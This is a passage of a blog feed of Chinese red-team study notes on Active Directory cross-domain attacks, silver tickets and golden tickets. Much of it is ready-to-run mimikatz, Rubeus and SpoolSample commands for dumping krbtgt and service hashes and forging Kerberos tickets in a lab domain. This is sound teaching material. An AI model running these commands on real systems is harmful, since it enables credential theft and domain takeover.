aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在子域普通用户权限的计算机中构造黄金票据</p><pre class="line-numbers language-none"><code class="language-none">mimikatz &quot;Kerberos::golden &#x2F;user:Administrator &#x2F;domain:sub.teamssix.com &#x2F;sid:S-1-5-21-1655164184-1934932396-2547489287 &#x2F;sids:S-1-5-21-2230503874-1187844892-774991719-519 &#x2F;krbtgt:b53a5c7c51648f033b96971e7ae4ee45 &#x2F;ptt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202110211315739.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="4、利用无约束委派和-MS-RPRN-获取信任林权限"><a href="#4、利用无约束委派和-MS-RPRN-获取信任林权限" class="headerlink" title="4、利用无约束委派和 MS-RPRN 获取信任林权限"></a>4、利用无约束委派和 MS-RPRN 获取信任林权限</h2><p>如果已经获取了域林中某个域控权限，或者配置了无约束委派的任何服务器的权限，那么就可以使用 MS RPRN 的 RpcRemoteFindPrinterChangeNotification(Ex) 方法，使信任林的域控制器向已被控制的服务器发送身份认证请求，利用捕获的票据获取信任林内任意用户的哈希值。</p><p>假设这里获取了 teamssix.com 域的域控权限，且 0day.org 与 teamssix.com 域有林信任关系</p><p>首先在 teamssix.com 的域控上监听身份认证请求</p><pre class="line-numbers language-none"><code class="language-none">rubeus.exe monitor &#x2F;interval:5 &#x2F;filteruser:OWA2010SP3$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">interval: 用于设置监控的时间间隔filteruser: 用于指定需要关注的主机，这里的 OWA2010SP3 是 0day.org 域控的主机名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>开启监听后，使用 SpoolSample 工具让 OWA2010SP3.0day.org 向 dc.teamssix.com 发送身份认证请求</p><pre class="line-numbers language-none"><code class="language-none">SpoolSample.exe OWA2010SP3.0day.org dc.teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获得票据后，使用 rubeus 将票据注入内存</p><pre class="line-numbers language-none"><code class="language-none">rubeus.exe ptt &#x2F;ticket:&lt;TGT 票据&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 mimikatz 获取目标的 krbtgt 散列值</p><pre class="line-numbers language-none"><code class="language-none">mimikatz.exe &quot;lsadump::dcsync &#x2F;domain:0day.org &#x2F;user:0day\krbtgt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来，构造黄金票据并将其注入内存，就能够获得 0day.org 域控的权限了</p><pre class="line-numbers language-none"><code class="language-none">mimikatz &quot;Kerberos::golden &#x2F;user:Administrator &#x2F;domain:0day.org &#x2F;sid:5-1-5-21-1812920812-2335051732-3517558806 &#x2F;rc4:b53a5c8c51648f053b96971e7ae4ee25 &#x2F;ptt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="0x31-后记"><a href="#0x31-后记" class="headerlink" title="0x31 后记"></a>0x31 后记</h1><p>自 2021年 2 月 3 日发布内网学习笔记第一节笔记开始，已经过去了大半年的时间，虽然是 2021 年 2 月 3 号发布文章，但实际上早在 2020 年的 10 月份就已经开始购入《内网安全攻防》这本书，并打算开始学习内网了，这样算下来到今年的 10 月份，正好一年的时间，这一年来发现真的是越学越感觉自己所掌握的知识太少，而自己只不过刚刚接触了点皮毛而已，这门艺术又是如此的迷人，吸引着自己不断去学习、探索。</p><p>在此感谢 MS 08067 实验室里的徐焱、贾晓璐所编写的《内网安全攻防》，感谢每篇笔记最后参考链接的作者们，感谢曾经帮助我解决所碰到问题的大佬们，正是有你们这些前人才使得我们后人有了学习的方向以及参考，谢谢你们。</p><blockquote><p>最后，还有一点要注意的就是， 内网学习笔记系列只是我个人在学习内网的过程中所做的笔记，建议不要当做教程看，因为其中我本身已经知道的知识点和感觉不重要知识点我是没有记录的。</p><p>将自己的笔记公开发出来的目的有二：一是便于自己遗忘时随时查找，这也是17年我建立这个公众号的主要目的；二是在笔记中我会记录一些坑的解决方法，如果你碰到和我一样的问题，或许我这小菜鸟写的笔记就能帮助到你。</p></blockquote><p>希望我的这一点学习笔记，也能帮助到想要学习内网的后人们。</p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p><p>原文链接：<a href="https://www.teamssix.com/211027-163641.html">https://www.teamssix.com/211027-163641.html</a></p><p>参考链接：</p><p><a href="https://xz.aliyun.com/t/4008">https://xz.aliyun.com/t/4008</a><br><a href="https://xz.aliyun.com/t/7311">https://xz.aliyun.com/t/7311</a><br><a href="https://xz.aliyun.com/t/7875">https://xz.aliyun.com/t/7875</a><br><a href="https://bipy.me/post/crack-rar/">https://bipy.me/post/crack-rar/</a><br><a href="https://ehang-io.github.io/nps/">https://ehang-io.github.io/nps/</a><br><a href="https://baike.baidu.com/item/DMZ">https://baike.baidu.com/item/DMZ</a><br><a href="https://baike.baidu.com/item/AGDLP">https://baike.baidu.com/item/AGDLP</a><br><a href="https://www.jianshu.com/p/23a4e8978a30">https://www.jianshu.com/p/23a4e8978a30</a><br><a href="https://www.jianshu.com/p/27730ab4a6db">https://www.jianshu.com/p/27730ab4a6db</a><br><a href="https://www.jianshu.com/p/331aa59fff5d">https://www.jianshu.com/p/331aa59fff5d</a><br><a href="https://www.jianshu.com/p/a210528f9b35">https://www.jianshu.com/p/a210528f9b35</a><br><a href="https://www.jianshu.com/p/c8f5c374466a">https://www.jianshu.com/p/c8f5c374466a</a><br><a href="https://www.sqlsec.com/2019/10/nc.html">https://www.sqlsec.com/2019/10/nc.html</a><br><a href="https://evi1cg.me/archives/Powerup.html">https://evi1cg.me/archives/Powerup.html</a><br><a href="https://www.anquanke.com/post/id/184855">https://www.anquanke.com/post/id/184855</a><br><a href="https://baike.baidu.com/item/NTLM/6371298">https://baike.baidu.com/item/NTLM/6371298</a><br><a href="https://www.hi-linux.com/posts/61543.html">https://www.hi-linux.com/posts/61543.html</a><br><a href="https://baike.baidu.com/item/LLMNR/1116392">https://baike.baidu.com/item/LLMNR/1116392</a><br><a href="https://www.freebuf.com/sectool/158393.html">https://www.freebuf.com/sectool/158393.html</a><br><a href="https://www.freebuf.com/sectool/179002.html">https://www.freebuf.com/sectool/179002.html</a><br><a href="https://www.freebuf.com/sectool/210450.html">https://www.freebuf.com/sectool/210450.html</a><br><a href="https://www.sqlsec.com/2019/10/hashcat.html">https://www.sqlsec.com/2019/10/hashcat.html</a><br><a href="https://www.freebuf.com/articles/246440.html">https://www.freebuf.com/articles/246440.html</a><br><a href="https://baike.baidu.com/item/Windows%E5%9F%9F">https://baike.baidu.com/item/Windows%E5%9F%9F</a><br><a href="https://www.cnblogs.com/lfoder/p/8241548.html">https://www.cnblogs.com/lfoder/p/8241548.html</a><br><a href="https://www.cnblogs.com/Xy--1/p/13216686.html">https://www.cnblogs.com/Xy–1/p/13216686.html</a><br><a href="https://zh.wikipedia.org/wiki/Active_Directory">https://zh.wikipedia.org/wiki/Active_Directory</a><br><a href="https://baike.baidu.com/item/%E5%9F%9F%E6%9E%97">https://baike.baidu.com/item/%E5%9F%9F%E6%9E%97</a><br><a href="https://baike.baidu.com/item/%E5%9F%9F%E6%A0%91">https://baike.baidu.com/item/%E5%9F%9F%E6%A0%91</a><br><a href="https://www.cnblogs.com/micr067/p/12263337.html">https://www.cnblogs.com/micr067/p/12263337.html</a><br><a href="https://www.cnblogs.com/micr067/p/12307519.html">https://www.cnblogs.com/micr067/p/12307519.html</a><br><a href="https://www.cnblogs.com/zpchcbd/p/11707302.html">https://www.cnblogs.com/zpchcbd/p/11707302.html</a><br><a href="https://www.cnblogs.com/frendguo/p/11761693.html">https://www.cnblogs.com/frendguo/p/11761693.html</a><br><a href="https://www.cnblogs.com/websecyw/p/11835830.html">https://www.cnblogs.com/websecyw/p/11835830.html</a><br><a href="https://www.freebuf.com/articles/web/251389.html">https://www.freebuf.com/articles/web/251389.html</a><br><a href="https://www.freebuf.com/articles/web/274035.html">https://www.freebuf.com/articles/web/274035.html</a><br><a href="https://www.freebuf.com/articles/web/280406.html">https://www.freebuf.com/articles/web/280406.html</a><br><a href="https://y4er.com/post/kerberos-kerberoasting-spn">https://y4er.com/post/kerberos-kerberoasting-spn</a><br><a href="https://www.cnblogs.com/lavender000/p/6931405.html">https://www.cnblogs.com/lavender000/p/6931405.html</a><br><a href="https://cloud.tencent.com/developer/article/1043370">https://cloud.tencent.com/developer/article/1043370</a><br><a href="https://cloud.tencent.com/developer/article/1170758">https://cloud.tencent.com/developer/article/1170758</a><br><a href="https://cloud.tencent.com/developer/article/1752145">https://cloud.tencent.com/developer/article/1752145</a><br><a href="https://cloud.tencent.com/developer/article/1752180">https://cloud.tencent.com/developer/article/1752180</a><br><a href="https://cloud.tencent.com/developer/article/1752212">https://cloud.tencent.com/developer/article/1752212</a><br><a href="https://cloud.tencent.com/developer/article/1760135">https://cloud.tencent.com/developer/article/1760135</a><br><a href="https://cloud.tencent.com/developer/article/1772183">https://cloud.tencent.com/developer/article/1772183</a><br><a href="https://www.freebuf.com/articles/system/114731.html">https://www.freebuf.com/articles/system/114731.html</a><br><a href="https://www.freebuf.com/articles/system/194549.html">https://www.freebuf.com/articles/system/194549.html</a><br><a href="https://baike.baidu.com/item/Windows%20Power%20Shell">https://baike.baidu.com/item/Windows%20Power%20Shell</a><br><a href="https://www.freebuf.com/articles/network/251267.html">https://www.freebuf.com/articles/network/251267.html</a><br><a href="https://www.freebuf.com/articles/network/261454.html">https://www.freebuf.com/articles/network/261454.html</a><br><a href="https://blog.csdn.net/henter/article/details/80079531">https://blog.csdn.net/henter/article/details/80079531</a><br><a href="https://www.cnblogs.com/coderge/articles/13768824.html">https://www.cnblogs.com/coderge/articles/13768824.html</a><br><a href="https://blog.csdn.net/nathan8/article/details/108804056">https://blog.csdn.net/nathan8/article/details/108804056</a><br><a href="https://baike.baidu.com/item/%E5%B7%A5%E4%BD%9C%E7%BB%84">https://baike.baidu.com/item/%E5%B7%A5%E4%BD%9C%E7%BB%84</a><br><a href="https://blog.csdn.net/wulantian/article/details/42418231">https://blog.csdn.net/wulantian/article/details/42418231</a><br><a href="https://blog.csdn.net/bring_coco/article/details/113550173">https://blog.csdn.net/bring_coco/article/details/113550173</a><br><a href="https://blog.csdn.net/qq_32393893/article/details/108904697">https://blog.csdn.net/qq_32393893/article/details/108904697</a><br><a href="https://blog.csdn.net/qq_34640691/article/details/111881910">https://blog.csdn.net/qq_34640691/article/details/111881910</a><br><a href="https://blog.csdn.net/qq_36279445/article/details/110647055">https://blog.csdn.net/qq_36279445/article/details/110647055</a><br><a href="https://blog.csdn.net/qq_45742511/article/details/117301437">https://blog.csdn.net/qq_45742511/article/details/117301437</a><br><a href="https://baike.baidu.com/item/NetBIOS%E5%8D%8F%E8%AE%AE/8938996">https://baike.baidu.com/item/NetBIOS%E5%8D%8F%E8%AE%AE/8938996</a><br><a href="https://blog.csdn.net/weixin_44064908/article/details/103920329">https://blog.csdn.net/weixin_44064908/article/details/103920329</a><br><a href="https://blog.csdn.net/weixin_45116657/article/details/103449931">https://blog.csdn.net/weixin_45116657/article/details/103449931</a><br><a href="https://xiaix.me/li-yong-icmp-sui-dao-chuan-tou-fang-huo-qiang/">https://xiaix.me/li-yong-icmp-sui-dao-chuan-tou-fang-huo-qiang/</a><br><a href="https://baike.baidu.com/item/%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95">https://baike.baidu.com/item/%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95</a><br><a href="https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/">https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/</a><br><a href="https://www.mondayice.com/2021/07/10/cobalt-strike-intranet-penetration-domain-control-attack/">https://www.mondayice.com/2021/07/10/cobalt-strike-intranet-penetration-domain-control-attack/</a><br><a href="https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/">https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/</a><br><a href="https://pingmaoer.github.io/2020/03/31/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/">https://pingmaoer.github.io/2020/03/31/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/</a><br><a href="https://mysock.net/2021/01/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%94%A8%20rar2john+hashcat%20%E7%A0%B4%E8%A7%A3%20RAR%20%E6%96%87%E4%BB%B6%E5%AF%86%E7%A0%81/">https://mysock.net/2021/01/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%94%A8%20rar2john+hashcat%20%E7%A0%B4%E8%A7%A3%20RAR%20%E6%96%87%E4%BB%B6%E5%AF%86%E7%A0%81/</a></p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【内网学习笔记】30、跨域安全（完结）</title>
      <link href="//211022-122217.html"/>
      <url>//211022-122217.html</url>
      
        <content type="html"><![CDATA[<h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>常见的跨域攻击方法有以下几种：</p><p>i、利用常规的渗透方法，比如 Web 漏洞</p><p>ii、利用已知散列值进行哈希传递或票据传递，因为有可能域内的密码是通用的</p><p>iii、利用域信任关系</p><p>这里主要看第三种：域信任关系</p><p>当有多个域时，不同的域之间想进行资源共享，就需要用到域信任，只有当域之间互相信任后，才能进行资源共享。</p><p>域信任关系可分为单向信任和双向信任。单向信任即 A 信任 B，但 B 不信任 A，双向信任同理。在创建子域时，系统会在新的子域和父域之间自动创建双向可传递信任关系。</p><p>域信任关系又可分为内部信任和外部信任。内部信任是指在同一个林中域之间的信任关系，这种信任关系是可传递的；外部信任指不同林之间域的信任关系，这种信任关系要视林间信任类型来判断是不是可传递。</p><p>在 Windows 操作系统中，只有 Domain Admins 组中的用户可以管理域信任关系；Enterprise Admins 组（仅出现在林的根域中）的成员对林中所有域拥有完全控制权限，默认情况下，该组包含林中所有域控上具有 administrators 权限的成员。</p><h2 id="1、获取域信息"><a href="#1、获取域信息" class="headerlink" title="1、获取域信息"></a>1、获取域信息</h2><p>这里使用工具 lg 进行域内信息的收集，lg 是一款用 C++ 编写的用于管理本地用户组和域本地用户组的命令行工具，可用它来收集远程主机用户和组的信息。</p><p>枚举 teamssix 域中的用户组</p><pre class="line-numbers language-none"><code class="language-none">lg.exe teamssix\.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>枚举远程计算机的用户组，如果提示拒绝访问，说明没有信任关系</p><pre class="line-numbers language-none"><code class="language-none">lg.exe \\dc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>枚举远程计算机的用户名</p><pre class="line-numbers language-none"><code class="language-none">lg.exe \\dc -lu<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>枚举远程系统中全部用户的 SID</p><pre class="line-numbers language-none"><code class="language-none">lg.exe \\dc -lu -sidsout<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>枚举远程系统指定组中的所有成员的 SID</p><pre class="line-numbers language-none"><code class="language-none">lg.exe \\dc\administrators -lu -sidsout<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2、利用域信任密钥获取目标域权限"><a href="#2、利用域信任密钥获取目标域权限" class="headerlink" title="2、利用域信任密钥获取目标域权限"></a>2、利用域信任密钥获取目标域权限</h2><p>这里环境信息为：</p><p>父域的域控：dc.teamssix.com</p><p>子域的域控：subdc.sub.teamssix.com</p><p>子域内的计算机：user4.sub.teamssix.com</p><p>子域内的普通用户：user4</p><p>在子域的域控中使用 mimikatz 获取需要的信息</p><pre class="line-numbers language-none"><code class="language-none">mimikatz.exe privilege::debug &quot;lsadump::lsa &#x2F;patch &#x2F;user:administrator&quot; &quot;lsadump::trust &#x2F;patch&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到当前域的 SID 、父域的 SID 和子域域管 NTLM 哈希后，在子域的普通用户机器上利用 mimikatz 制作信任票据</p><blockquote><p>这里的 sids 是父域的 sid，sids 后的 519 表示创建的用户属于父域的管理员组</p></blockquote><pre class="line-numbers language-none"><code class="language-none">mimikatz.exe &quot;kerberos::golden &#x2F;domain:sub.teamssix.com &#x2F;sid:S-1-5-21-1655164184-1934932396-2547489287 &#x2F;sids:S-1-5-21-2230503874-1187844892-774991719-519 &#x2F;rc4:5bfd59b5e1f78a794f714af07eac869f &#x2F;user:administrator &#x2F;service:krbtgt &#x2F;target:teamssix.com &#x2F;ticket:subdc_administrator.kirbi&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 利用刚刚制作的信任票据获取目标域中目标服务的 TGS 并保存到文件中</p><pre class="line-numbers language-none"><code class="language-none">asktgs subdc_administrator.kirbi cifs&#x2F;dc.teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将获取的 TGS 票据注入到内存中</p><pre class="line-numbers language-none"><code class="language-none">kirbikator lsa cifs.dc.teamssix.com.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 dir 访问目标域控</p><pre class="line-numbers language-none"><code class="language-none">dir \\dc.teamssix.com\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202110211307519.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="3、利用-krbtgt-散列值获取目标域的权限"><a href="#3、利用-krbtgt-散列值获取目标域的权限" class="headerlink" title="3、利用 krbtgt 散列值获取目标域的权限"></a>3、利用 krbtgt 散列值获取目标域的权限</h2><p>如果攻击者获取了林内任意域的 krbtgt 散列值，就可以使用 sidHistory 获得该林的完整权限。</p><p>首先获取当前子域和父域的 SID 值，可以使用以下工具或命令</p><pre class="line-numbers language-none"><code class="language-none">wmic useraccount get caption,sidwhoami &#x2F;useradfind.exe -sc u:user4 | findstr SidGet-DomainSID sub.teamssix.com  # PowerView 里的命令<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来获取子域的 krbtgt 的哈希值，使用 mimikatz 即可</p><pre class="line-numbers language-none"><code class="language-none">mimikatz privilege::debug &quot;lsadump::lsa &#x2F;patch &#x2F;user:krbtgt&quot; sekurlsa::krbtgt exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在子域普通用户权限的计算机中构造黄金票据</p><pre class="line-numbers language-none"><code class="language-none">mimikatz &quot;Kerberos::golden &#x2F;user:Administrator &#x2F;domain:sub.teamssix.com &#x2F;sid:S-1-5-21-1655164184-1934932396-2547489287 &#x2F;sids:S-1-5-21-2230503874-1187844892-774991719-519 &#x2F;krbtgt:b53a5c7c51648f033b96971e7ae4ee45 &#x2F;ptt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202110211315739.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="4、利用无约束委派和-MS-RPRN-获取信任林权限"><a href="#4、利用无约束委派和-MS-RPRN-获取信任林权限" class="headerlink" title="4、利用无约束委派和 MS-RPRN 获取信任林权限"></a>4、利用无约束委派和 MS-RPRN 获取信任林权限</h2><p>如果已经获取了域林中某个域控权限，或者配置了无约束委派的任何服务器的权限，那么就可以使用 MS RPRN 的 RpcRemoteFindPrinterChangeNotification(Ex) 方法，使信任林的域控制器向已被控制的服务器发送身份认证请求，利用捕获的票据获取信任林内任意用户的哈希值。</p><p>假设这里获取了 teamssix.com 域的域控权限，且 0day.org 与 teamssix.com 域有林信任关系</p><p>首先在 teamssix.com 的域控上监听身份认证请求</p><pre class="line-numbers language-none"><code class="language-none">rubeus.exe monitor &#x2F;interval:5 &#x2F;filteruser:OWA2010SP3$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">interval: 用于设置监控的时间间隔filteruser: 用于指定需要关注的主机，这里的 OWA2010SP3 是 0day.org 域控的主机名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>开启监听后，使用 SpoolSample 工具让 OWA2010SP3.0day.org 向 dc.teamssix.com 发送身份认证请求</p><pre class="line-numbers language-none"><code class="language-none">SpoolSample.exe OWA2010SP3.0day.org dc.teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获得票据后，使用 rubeus 将票据注入内存</p><pre class="line-numbers language-none"><code class="language-none">rubeus.exe ptt &#x2F;ticket:&lt;TGT 票据&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 mimikatz 获取目标的 krbtgt 散列值</p><pre class="line-numbers language-none"><code class="language-none">mimikatz.exe &quot;lsadump::dcsync &#x2F;domain:0day.org &#x2F;user:0day\krbtgt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来，构造黄金票据并将其注入内存，就能够获得 0day.org 域控的权限了</p><pre class="line-numbers language-none"><code class="language-none">mimikatz &quot;Kerberos::golden &#x2F;user:Administrator &#x2F;domain:0day.org &#x2F;sid:5-1-5-21-1812920812-2335051732-3517558806 &#x2F;rc4:b53a5c8c51648f053b96971e7ae4ee25 &#x2F;ptt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>参考文章：</p><p><a href="https://blog.csdn.net/qq_34640691/article/details/111881910">https://blog.csdn.net/qq_34640691/article/details/111881910</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【内网学习笔记】29、白银票据</title>
      <link href="//211009-145524.html"/>
      <url>//211009-145524.html</url>
      
        <content type="html"><![CDATA[<h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>白银票据（Sliver Ticket） 不同于黄金票据（Golden Ticket）</p><blockquote><p>Kerberos 协议详解：<a href="https://teamssix.com/210923-151418.html">https://teamssix.com/210923-151418.html</a></p></blockquote><p>白银票据不与密钥分发中心 KDC 交互，因此没有了 Kerberos 认证协议里的前 4 步，通过伪造的票据授予服务 TGS 生成伪造的服务票据  ST 直接与服务器 Server 进行交互。</p><p>白银票据与黄金票据的区别：</p><p>1、白银票据不经过 KDC，因此白银票据日志相对于黄金票据会更少，同时白银票据的日志都在目标服务器上，域控上不会有日志</p><p>2、白银票据利用服务账户的哈希值，不同于黄金票据利用 krbtgt 账户的哈希值，因此白银票据更加隐蔽，但白银票据的权限就远不如黄金票据的权限了</p><p>想利用白银票据需要先知道以下信息：</p><ul><li>域名</li><li>域 SID</li><li>目标服务器的 FQDN 即完整的域名</li><li>可利用的服务</li><li>服务账户的 NTLM 哈希</li><li>伪造的用户名即任意用户名</li></ul><h2 id="1、伪造-CIFS-服务权限"><a href="#1、伪造-CIFS-服务权限" class="headerlink" title="1、伪造 CIFS 服务权限"></a>1、伪造 CIFS 服务权限</h2><p>CIFS 服务常用于 Windows 主机之间的文件共享，首先使用 mimikatz 获取服务账户的 NTLM 哈希，这里使用的 Username 为 DC$ 的 NTLM 哈希</p><pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe log &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到 HASH 后，清空当前系统中的票据，防止其他票据干扰</p><pre class="line-numbers language-none"><code class="language-none">klist purge# 或者在 mimikatz 里清除kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用 mimikatz 生成伪造的白银票据</p><pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe &quot;kerberos::golden &#x2F;user:t &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;target:dc &#x2F;rc4:ef9e49a41feaa171f642016fd4cb7e7a &#x2F;service:cifs &#x2F;ptt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​    <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202110091330529.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>在伪造票据后，使用 dir 命令就能读取到目标的共享服务了。</p><h2 id="2、伪造-LDAP-服务权限"><a href="#2、伪造-LDAP-服务权限" class="headerlink" title="2、伪造 LDAP 服务权限"></a>2、伪造 LDAP 服务权限</h2><p>首先判断当前权限是否可以使用 dcsync 域控进行同步</p><pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe &quot;lsadump::dcsync &#x2F;dc:dc &#x2F;domain:teamssix.com &#x2F;user:krbtgt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果返回 ERROR 说明当前权限不能进行 dcsync 操作</p><p>接下来生成 LDAP 服务的白银票据</p><pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe &quot;kerberos::golden &#x2F;user:t &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;target:dc &#x2F;rc4:ef9e49a41feaa171f642016fd4cb7e7a &#x2F;service:ldap &#x2F;ptt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202110091403286.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>参考文章：</p><p><a href="https://cloud.tencent.com/developer/article/1760135">https://cloud.tencent.com/developer/article/1760135</a></p><p><a href="https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/">https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/</a></p><p>原文链接：</p><p><a href="https://teamssix.com/211009-145524.html">https://teamssix.com/211009-145524.html</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【内网学习笔记】28、黄金票据</title>
      <link href="//210927-163036.html"/>
      <url>//210927-163036.html</url>
      
        <content type="html"><![CDATA[<h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>RT 在利用黄金票据（Golden Ticket）进行 PTP 票据传递时，需要先知道以下信息：</p><ul><li>伪造的域管理员用户名</li><li>完整的域名</li><li>域 SID</li><li>krbtgt 的 NTLM Hash 或 AES-256 值</li></ul><p>其中 krbtgt 用户是域自带的用户，被 KDC 密钥分发中心服务所使用，属于 Domain Admins 组。</p><p>在域环境中，每个用户账号的票据都是由 krbtgt 用户所生成的，因此如果知道了 krbtgt 用户的 NTLM Hash 或者 AES-256 值，就可以伪造域内任意用户的身份了。</p><h2 id="1、导出-krbtgt-的-NTLM-Hash"><a href="#1、导出-krbtgt-的-NTLM-Hash" class="headerlink" title="1、导出 krbtgt 的 NTLM Hash"></a>1、导出 krbtgt 的 NTLM Hash</h2><p>在 mimikatz 下执行以下命令</p><pre class="line-numbers language-none"><code class="language-none">lsadump::dcsync &#x2F;domain:teamssix.com &#x2F;user:krbtgt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里得到 krbtgt 的 NTLM Hash 为 d685b9c4fa2d318a9943ed68948af087</p><p>该命令使用的 dcsync 功能远程转储 AD 里的 ntds.dit，使用 /user 